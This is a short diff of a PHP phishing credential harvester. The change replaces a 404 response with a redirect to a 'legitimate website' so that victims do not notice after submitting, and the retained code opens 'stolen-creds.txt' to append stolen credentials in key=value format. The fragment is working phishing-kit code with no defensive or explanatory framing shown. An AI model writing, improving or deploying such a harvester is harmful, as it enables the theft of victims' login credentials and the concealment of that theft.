@@ -1,6 +1,6 @@
 <?php
-	// Redirect user to 404 page
-	header('HTTP/1.0 404 Not Found');
+	// Redirect to legitimate website
+	header ("Location: PAGELINK ");
 	//Create file handle
 	$handle = fopen("stolen-creds.txt", "a");
 	// Store all stolen creds, in a 'key=value' format
